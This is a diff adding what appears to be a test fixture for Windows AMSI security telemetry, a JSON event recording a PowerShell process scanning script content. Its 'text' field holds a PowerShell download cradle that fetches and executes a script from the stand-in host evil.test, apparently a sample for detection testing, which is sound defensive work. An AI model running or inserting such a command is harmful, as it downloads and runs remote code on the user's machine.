@@ -1,0 +1,17 @@
+{
+  "type": "amsi_content",
+  "meta": {
+    "pid": 6144,
+    "ppid": 0,
+    "user": { "os": "windows", "sid": "S-1-5-21-1004336348-1177238915-682003330-1001", "integrity_level": 8192 },
+    "timestamp_ns": 1759300000000000000,
+    "comm": "powershell.exe"
+  },
+  "session": 63544,
+  "app_name": "PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_10.0.26100.1",
+  "content_size": 154,
+  "original_size": 154,
+  "text": "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')",
+  "content_hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+  "scan_result": 1
+}
